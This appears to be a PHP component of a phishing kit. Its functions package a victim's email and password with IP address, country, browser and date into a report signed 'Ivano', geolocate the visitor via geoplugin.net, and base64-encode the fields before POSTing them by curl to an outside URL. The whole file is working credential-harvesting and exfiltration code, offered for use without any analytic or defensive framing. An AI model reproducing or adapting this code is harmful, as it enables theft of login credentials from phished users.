<?php
/**
 * All string
 * @return [type] [description]
 */
function body($email, $password){
	$country = get_country();
	$ip = getenv("REMOTE_ADDR");

	$message .= "Email     : ". $email ."\n";
	$message .= "Password  : ". $password ."\n";
	$message .= "browser  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "Country : ".$country."\n";
	$message .= "=============IP*DATE*MX_RECORDS=================\n";
	$message .= "IP      : ".$ip."\n";
	// $message .= "Host : ". $this->host_name ."\n";
	$message .= "Date: ". date("D M d, Y g:i a") ."\n";
	$message .= "=============Ivano=================\n";

	return $message;
}

/**
 * Visit 
 * @return [type] [description]
 */
function get_country(){
   $client  = @$_SERVER['HTTP_CLIENT_IP'];
   $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
   $remote  = $_SERVER['REMOTE_ADDR'];
   $result  = "Unknown";

   if(filter_var($client, FILTER_VALIDATE_IP)){
      $ip = $client;
   }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
      $ip = $forward;
   }else{
      $ip = $remote;
   }

   $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

   if($ip_data && $ip_data->geoplugin_countryName != null){
      $result = $ip_data->geoplugin_countryName;
   }

   return $result;
}

/**
 * Enter
 * @param  array  $arr [description]
 * @return [type]      [description]
 */
function arg_gkd($arr = array()){
	$postData = '';
	foreach($arr as $i => $val){ 
	    $postData .= $i .'='.base64_encode($val).'&'; 
	}
	return rtrim($postData, '&');
}

function process_gkd($url, $arr = array()){
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url );
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch,CURLOPT_POSTFIELDS, arg_gkd($arr) );


 $result = curl_exec($ch);
 curl_close($ch);

 return $result;
}